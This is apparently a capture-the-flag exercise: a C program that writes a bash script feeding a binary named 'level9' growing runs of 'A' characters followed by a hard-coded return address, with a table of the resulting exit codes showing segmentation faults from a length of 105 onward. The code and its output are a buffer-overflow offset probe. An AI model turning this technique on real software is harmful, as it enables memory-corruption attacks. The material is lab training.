#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void	main(void)
{
	int i = 90;
	
	printf("#!/bin/bash\n");
	while (i < 150)
	{
		printf("echo \"\t%d\"\n", i);
		printf("./level9 `python -c 'print \"A\"*%d + \"\\x60\\x60\\xd8\\xb7\"'`\n", i);
		printf("echo $?\n");
		i++;
	}
}

90	| > 11
91	| > 11
92	| > 11
93	| > 11
94	| > 11
95	| > 11
96	| > 11
97	| > 189
98	| > 222
99	| > 102
100	| > 102
101	| > 71
102	| > 71
103	| > 71
104	| > 71
105	| 10763 Segmentation fault > 139
106	| 10766 Segmentation fault > 139
107	| 10769 Segmentation fault > 139
108	| 10772 Segmentation fault > 139
109	| 10775 Segmentation fault > 139
110	| 10778 Segmentation fault > 139
